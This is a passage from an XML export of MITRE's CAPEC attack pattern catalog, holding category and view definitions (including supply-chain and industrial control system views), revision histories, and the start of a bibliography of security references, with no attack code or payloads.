               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-11-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-05-01</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2017-05-01">Alter System Components</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="527" Name="DEPRECATED: Manipulate System Users" Status="Deprecated">
         <ns0:Summary>This category has been deprecated as it is no longer used in any view.</ns0:Summary>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-05-01</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2017-05-01">Manipulate System Users</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="684" Name="Design" Status="Draft">
         <ns0:Summary>Attack patterns within this category focus on the exploitation of weaknesses within the Design phase of the CISA Supply Chain Lifecycle.</ns0:Summary>
         <ns0:Relationships>
            <ns0:Has_Member CAPEC_ID="447" />
         </ns0:Relationships>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-718" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2022-09-29</ns0:Submission_Date>
            </ns0:Submission>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="685" Name="Development and Production" Status="Draft">
         <ns0:Summary>Attack patterns within this category focus on the exploitation of weaknesses within the Development and Production phase of the CISA Supply Chain Lifecycle.</ns0:Summary>
         <ns0:Relationships>
            <ns0:Has_Member CAPEC_ID="444" />
            <ns0:Has_Member CAPEC_ID="690" />
         </ns0:Relationships>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-718" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2022-09-29</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2023-01-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="686" Name="Distribution" Status="Draft">
         <ns0:Summary>Attack patterns within this category focus on the exploitation of weaknesses within the Distribution phase of the CISA Supply Chain Lifecycle.</ns0:Summary>
         <ns0:Relationships>
            <ns0:Has_Member CAPEC_ID="439" />
         </ns0:Relationships>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-718" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2022-09-29</ns0:Submission_Date>
            </ns0:Submission>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="687" Name="Acquisition and Deployment" Status="Draft">
         <ns0:Summary>Attack patterns within this category focus on the exploitation of weaknesses within the Acquisition and Deployment phase of the CISA Supply Chain Lifecycle.</ns0:Summary>
         <ns0:Relationships>
            <ns0:Has_Member CAPEC_ID="536" />
         </ns0:Relationships>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-718" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2022-09-29</ns0:Submission_Date>
            </ns0:Submission>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="688" Name="Sustainment" Status="Draft">
         <ns0:Summary>Attack patterns within this category focus on the exploitation of weaknesses within the Sustainment phase of the CISA Supply Chain Lifecycle.</ns0:Summary>
         <ns0:Relationships>
            <ns0:Has_Member CAPEC_ID="184" />
            <ns0:Has_Member CAPEC_ID="440" />
            <ns0:Has_Member CAPEC_ID="444" />
            <ns0:Has_Member CAPEC_ID="536" />
            <ns0:Has_Member CAPEC_ID="690" />
         </ns0:Relationships>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-718" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2022-09-29</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2023-01-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="689" Name="Disposal" Status="Draft">
         <ns0:Summary>Attack patterns within this category focus on the exploitation of weaknesses within the Disposal phase of the CISA Supply Chain Lifecycle.</ns0:Summary>
         <ns0:Relationships>
            <ns0:Has_Member CAPEC_ID="675" />
         </ns0:Relationships>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-718" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2022-09-29</ns0:Submission_Date>
            </ns0:Submission>
         </ns0:Content_History>
      </ns0:Category>
   </ns0:Categories>
   <ns0:Views>
      <ns0:View ID="1000" Name="Mechanisms of Attack" Type="Graph" Status="Stable">
         <ns0:Objective>This view organizes attack patterns hierarchically based on mechanisms that are frequently employed when exploiting a vulnerability. The categories that are members of this view represent the different techniques used to attack a system. They do not, however, represent the consequences or goals of the attacks. There exists the potential for some attack patterns to align with more than one category depending on one&#8217;s perspective. To counter this, emphasis was placed such that attack patterns as presented within each category use a technique not sometimes, but without exception.</ns0:Objective>
         <ns0:Members>
            <ns0:Has_Member CAPEC_ID="156" />
            <ns0:Has_Member CAPEC_ID="210" />
            <ns0:Has_Member CAPEC_ID="255" />
            <ns0:Has_Member CAPEC_ID="262" />
            <ns0:Has_Member CAPEC_ID="152" />
            <ns0:Has_Member CAPEC_ID="223" />
            <ns0:Has_Member CAPEC_ID="172" />
            <ns0:Has_Member CAPEC_ID="118" />
            <ns0:Has_Member CAPEC_ID="225" />
         </ns0:Members>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-11-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated View_Objective</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships, View_Objective</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:View>
      <ns0:View ID="2000" Name="Comprehensive CAPEC Dictionary" Type="Implicit" Status="Draft">
         <ns0:Objective>This view (slice) covers all the elements in CAPEC.</ns0:Objective>
         <ns0:Filter>/Attack_Pattern_Catalog/*[not(self::External_References)]/*</ns0:Filter>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
         </ns0:Content_History>
      </ns0:View>
      <ns0:View ID="282" Name="Meta Abstractions" Type="Implicit" Status="Draft">
         <ns0:Objective>This view (slice) covers meta abstraction attack patterns.</ns0:Objective>
         <ns0:Filter>/Attack_Pattern_Catalog/Attack_Patterns/Attack_Pattern[@Abstraction='Meta']</ns0:Filter>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
         </ns0:Content_History>
      </ns0:View>
      <ns0:View ID="283" Name="Standard Abstractions" Type="Implicit" Status="Draft">
         <ns0:Objective>This view (slice) covers standard abstraction attack patterns.</ns0:Objective>
         <ns0:Filter>/Attack_Pattern_Catalog/Attack_Patterns/Attack_Pattern[@Abstraction='Standard']</ns0:Filter>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
         </ns0:Content_History>
      </ns0:View>
      <ns0:View ID="284" Name="Detailed Abstractions" Type="Implicit" Status="Draft">
         <ns0:Objective>This view (slice) covers detailed abstraction attack patterns.</ns0:Objective>
         <ns0:Filter>/Attack_Pattern_Catalog/Attack_Patterns/Attack_Pattern[@Abstraction='Detailed']</ns0:Filter>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
         </ns0:Content_History>
      </ns0:View>
      <ns0:View ID="3000" Name="Domains of Attack" Type="Graph" Status="Draft">
         <ns0:Objective>This view organizes attack patterns hierarchically based on the attack domain.</ns0:Objective>
         <ns0:Members>
            <ns0:Has_Member CAPEC_ID="513" />
            <ns0:Has_Member CAPEC_ID="515" />
            <ns0:Has_Member CAPEC_ID="512" />
            <ns0:Has_Member CAPEC_ID="437" />
            <ns0:Has_Member CAPEC_ID="403" />
            <ns0:Has_Member CAPEC_ID="514" />
         </ns0:Members>
         <ns0:Notes>
            <ns0:Note Type="Other">When this view is fully expanded, only the immediate children (meta patterns) of the top level categories will be visible. Lower level children (standard and detailed patterns) can be accessed by opening up the meta CAPEC entries. This is a known issue and will be corrected in a future release.</ns0:Note>
         </ns0:Notes>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Other_Notes</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:View>
      <ns0:View ID="333" Name="WASC Threat Classification 2.0" Type="Implicit" Status="Draft">
         <ns0:Objective>This view provides a mapping between the WASC Threat Classification 2.0 and CAPEC.</ns0:Objective>
         <ns0:Filter>/Attack_Pattern_Catalog/*/*[Taxonomy_Mappings/Taxonomy_Mapping[@Taxonomy_Name='WASC']]</ns0:Filter>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated View_Objective</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Type, Filter, Members</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:View>
      <ns0:View ID="483" Name="Deprecated Entries" Type="Implicit" Status="Draft">
         <ns0:Objective>CAPEC nodes in this view (slice) have been deprecated.</ns0:Objective>
         <ns0:Filter>/Attack_Pattern_Catalog/*/*[@Status='Deprecated']</ns0:Filter>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
         </ns0:Content_History>
      </ns0:View>
      <ns0:View ID="553" Name="Mobile Device Patterns" Type="Implicit" Status="Draft">
         <ns0:Objective>This view (slice) covers standard attack patterns that target direct exploitation of mobile devices.</ns0:Objective>
         <ns0:Filter>/Attack_Pattern_Catalog/*/*[@ID = (187, 498, 604, 605, 606, 608, 609, 610, 612, 613, 614, 615, 617, 618, 619, 621, 622, 623, 625, 626, 627, 628, 629)]</ns0:Filter>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2015-11-09</ns0:Submission_Date>
            </ns0:Submission>
         </ns0:Content_History>
      </ns0:View>
      <ns0:View ID="658" Name="ATT&amp;CK Related Patterns " Type="Implicit" Status="Draft">
         <ns0:Objective>This view (slice) covers patterns with mappings to the ATT&amp;CK knowledge base.</ns0:Objective>
         <ns0:Filter>/Attack_Pattern_Catalog/*/*[Taxonomy_Mappings/Taxonomy_Mapping[@Taxonomy_Name='ATTACK']]</ns0:Filter>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-622" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2020-12-17</ns0:Submission_Date>
            </ns0:Submission>
         </ns0:Content_History>
      </ns0:View>
      <ns0:View ID="659" Name="OWASP Related Patterns" Type="Implicit" Status="Draft">
         <ns0:Objective>This view (slice) covers patterns with mappings to OWASP Attacks.</ns0:Objective>
         <ns0:Filter>/Attack_Pattern_Catalog/*/*[Taxonomy_Mappings/Taxonomy_Mapping[@Taxonomy_Name='OWASP Attacks']]</ns0:Filter>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-623" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2020-12-17</ns0:Submission_Date>
            </ns0:Submission>
         </ns0:Content_History>
      </ns0:View>
      <ns0:View ID="683" Name="Supply Chain Risks" Type="Graph" Status="Draft">
         <ns0:Objective>This view covers patterns that fall within the CISA Supply Chain Lifecycle</ns0:Objective>
         <ns0:Members>
            <ns0:Has_Member CAPEC_ID="684" />
            <ns0:Has_Member CAPEC_ID="685" />
            <ns0:Has_Member CAPEC_ID="686" />
            <ns0:Has_Member CAPEC_ID="687" />
            <ns0:Has_Member CAPEC_ID="688" />
            <ns0:Has_Member CAPEC_ID="689" />
         </ns0:Members>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-718" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2022-09-29</ns0:Submission_Date>
            </ns0:Submission>
         </ns0:Content_History>
      </ns0:View>
      <ns0:View ID="703" Name="Industrial Control System (ICS) Patterns" Type="Explicit" Status="Draft">
         <ns0:Objective>This view contains a listing of CAPECs that apply to industrial control systems (ICS). Some children of these attack patterns might also be applicable.</ns0:Objective>
         <ns0:Members>
            <ns0:Has_Member CAPEC_ID="1" />
            <ns0:Has_Member CAPEC_ID="57" />
            <ns0:Has_Member CAPEC_ID="65" />
            <ns0:Has_Member CAPEC_ID="70" />
            <ns0:Has_Member CAPEC_ID="94" />
            <ns0:Has_Member CAPEC_ID="98" />
            <ns0:Has_Member CAPEC_ID="125" />
            <ns0:Has_Member CAPEC_ID="130" />
            <ns0:Has_Member CAPEC_ID="131" />
            <ns0:Has_Member CAPEC_ID="141" />
            <ns0:Has_Member CAPEC_ID="148" />
            <ns0:Has_Member CAPEC_ID="158" />
            <ns0:Has_Member CAPEC_ID="163" />
            <ns0:Has_Member CAPEC_ID="165" />
            <ns0:Has_Member CAPEC_ID="169" />
            <ns0:Has_Member CAPEC_ID="177" />
            <ns0:Has_Member CAPEC_ID="180" />
            <ns0:Has_Member CAPEC_ID="184" />
            <ns0:Has_Member CAPEC_ID="191" />
            <ns0:Has_Member CAPEC_ID="227" />
            <ns0:Has_Member CAPEC_ID="268" />
            <ns0:Has_Member CAPEC_ID="292" />
            <ns0:Has_Member CAPEC_ID="309" />
            <ns0:Has_Member CAPEC_ID="312" />
            <ns0:Has_Member CAPEC_ID="313" />
            <ns0:Has_Member CAPEC_ID="438" />
            <ns0:Has_Member CAPEC_ID="439" />
            <ns0:Has_Member CAPEC_ID="441" />
            <ns0:Has_Member CAPEC_ID="457" />
            <ns0:Has_Member CAPEC_ID="473" />
            <ns0:Has_Member CAPEC_ID="504" />
            <ns0:Has_Member CAPEC_ID="540" />
            <ns0:Has_Member CAPEC_ID="547" />
            <ns0:Has_Member CAPEC_ID="552" />
            <ns0:Has_Member CAPEC_ID="555" />
            <ns0:Has_Member CAPEC_ID="560" />
            <ns0:Has_Member CAPEC_ID="573" />
            <ns0:Has_Member CAPEC_ID="580" />
            <ns0:Has_Member CAPEC_ID="603" />
            <ns0:Has_Member CAPEC_ID="607" />
            <ns0:Has_Member CAPEC_ID="635" />
            <ns0:Has_Member CAPEC_ID="648" />
            <ns0:Has_Member CAPEC_ID="649" />
            <ns0:Has_Member CAPEC_ID="690" />
            <ns0:Has_Member CAPEC_ID="691" />
            <ns0:Has_Member CAPEC_ID="692" />
         </ns0:Members>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-752" />
         </ns0:References>
         <ns0:Notes>
            <ns0:Note Type="Other">This view was created in part by utilizing the ATT&amp;CK ICS Matrix [REF-752].</ns0:Note>
         </ns0:Notes>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2023-01-24</ns0:Submission_Date>
            </ns0:Submission>
         </ns0:Content_History>
      </ns0:View>
   </ns0:Views>
   <ns0:External_References>
      <ns0:External_Reference Reference_ID="REF-1">
         <ns0:Author>G. Hoglund</ns0:Author>
         <ns0:Author>G. McGraw</ns0:Author>
         <ns0:Title>Exploiting Software: How to Break Code</ns0:Title>
         <ns0:Publication_Year>2004</ns0:Publication_Year>
         <ns0:Publication_Month>--02</ns0:Publication_Month>
         <ns0:Publisher>Addison-Wesley</ns0:Publisher>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-2">
         <ns0:Title>Sharefuzz</ns0:Title>
         <ns0:URL>http://sharefuzz.sourceforge.net</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-3">
         <ns0:Author>Jeremiah Grossman</ns0:Author>
         <ns0:Title>Cross-Site Tracing (XST)</ns0:Title>
         <ns0:Publication_Year>2003</ns0:Publication_Year>
         <ns0:Publisher>WhiteHat Security</ns0:Publisher>
         <ns0:URL>http://www.cgisecurity.com/whitehat-mirror/WH-WhitePaper_XST_ebook.pdf</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-4">
         <ns0:Title>OWASP Web Security Testing Guide</ns0:Title>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>http://www.owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.7-Testing_for_ORM_Injection</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-6">
         <ns0:Title>Orion Application Server JSP Source Disclosure Vulnerability (Bugtraq ID: 17204)</ns0:Title>
         <ns0:Publisher>SecurityFocus</ns0:Publisher>
         <ns0:URL>http://www.securityfocus.com/bid/17204/info</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-9">
         <ns0:Title>OWASP Testing Guide</ns0:Title>
         <ns0:Edition>v4</ns0:Edition>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>https://www.owasp.org/index.php/Testing_for_Path_Traversal_(OWASP-AZ-001)</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-10">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/w/page/13246952/Path-Traversal</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-11">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/Directory-Indexing</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-13">
         <ns0:Author>Shaun Colley</ns0:Author>
         <ns0:Title>Crafting Symlinks for Fun and Profit</ns0:Title>
         <ns0:URL>http://www.infosecwriters.com/texts.php?op=display&amp;id=159</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-14">
         <ns0:Author>Hal Burch</ns0:Author>
         <ns0:Author>Brendan Saulsbury</ns0:Author>
         <ns0:Title>FIO30-C. Exclude user input from format strings</ns0:Title>
         <ns0:Publication_Year>2011</ns0:Publication_Year>
         <ns0:Publication_Month>--05</ns0:Publication_Month>
         <ns0:Publisher>CERT</ns0:Publisher>
         <ns0:URL>https://www.securecoding.cert.org/confluence/display/seccode/FIO30-C.+Exclude+user+input+from+format+strings</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-15">
         <ns0:Author>Robert Auger</ns0:Author>
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/Format-String</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-17">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/LDAP-Injection</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-22">
         <ns0:Title>Wikipedia</ns0:Title>
         <ns0:Publisher>The Wikimedia Foundation, Inc</ns0:Publisher>
         <ns0:URL>http://en.wikipedia.org/wiki/DNS_cache_poisoning</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-23">
         <ns0:Title>DNS Threats and DNS Weaknesses</ns0:Title>
         <ns0:Publisher>DNSSEC</ns0:Publisher>
         <ns0:URL>http://www.dnssec.net/dns-threats.php</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-24">
         <ns0:Title>Wikipedia</ns0:Title>
         <ns0:Publisher>The Wikimedia Foundation, Inc</ns0:Publisher>
         <ns0:URL>http://en.wikipedia.org/wiki/ARP_spoofing</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-27">
         <ns0:Title>Vulnerability Note VU#800113</ns0:Title>
         <ns0:Publication_Year>2008</ns0:Publication_Year>
         <ns0:Publication_Month>--07</ns0:Publication_Month>
         <ns0:Publication_Day>---08</ns0:Publication_Day>
         <ns0:Publisher>US CERT</ns0:Publisher>
         <ns0:URL>http://www.kb.cert.org/vuls/id/800113#pat</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-29">
         <ns0:Author>Silvio Cesare</ns0:Author>
         <ns0:Title>Share Library Call Redirection Via ELF PLT Infection</ns0:Title>
         <ns0:Edition>Issue 56</ns0:Edition>
         <ns0:Publication>Phrack Magazine</ns0:Publication>
         <ns0:Publication_Year>2000</ns0:Publication_Year>
         <ns0:URL>http://phrack.org/issues/56/7.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-30">
         <ns0:Title>OWASP Top 10 2007</ns0:Title>
         <ns0:Edition>2007</ns0:Edition>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>https://www.owasp.org/www-pdf-archive/OWASP_Top_10_2007.pdf</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-31">
         <ns0:Author>Manic Velocity</ns0:Author>
         <ns0:Title>Footprinting And The Basics Of Hacking</ns0:Title>
         <ns0:Publication>Web Textfiles</ns0:Publication>
         <ns0:URL>http://web.textfiles.com/hacking/footprinting.txt</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-32">
         <ns0:Author>Eddie Sutton</ns0:Author>
         <ns0:Title>Footprint: What Is And How Do You Erase Them</ns0:Title>
         <ns0:URL>http://www.infosecwriters.com/text_resources/pdf/Footprinting.pdf</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-33">
         <ns0:Author>Stuart McClure</ns0:Author>
         <ns0:Author>Joel Scambray</ns0:Author>
         <ns0:Author>George Kurtz</ns0:Author>
         <ns0:Title>Hacking Exposed: Network Security Secrets &amp; Solutions</ns0:Title>
         <ns0:Edition>6th Edition</ns0:Edition>
         <ns0:Publication_Year>2009</ns0:Publication_Year>
         <ns0:Publisher>McGraw Hill</ns0:Publisher>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-34">
         <ns0:Author>Gordon "Fyodor" Lyon</ns0:Author>
         <ns0:Title>Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning</ns0:Title>
         <ns0:Edition>3rd "Zero Day" Edition,</ns0:Edition>
         <ns0:Publication_Year>2008</ns0:Publication_Year>
         <ns0:Publisher>Insecure.com LLC, ISBN: 978-0-9799587-1-7</ns0:Publisher>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-35">
         <ns0:Author>G. Hoglund</ns0:Author>
         <ns0:Author>G. McGraw</ns0:Author>
         <ns0:Title>Exploiting Software: How to Break Code</ns0:Title>
         <ns0:Publication_Year>2004</ns0:Publication_Year>
         <ns0:Publication_Month>--02</ns0:Publication_Month>
         <ns0:Publisher>Addison-Wesley</ns0:Publisher>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-36">
         <ns0:Author>Saumil Shah</ns0:Author>
         <ns0:Title>An Introduction to HTTP fingerprinting</ns0:Title>
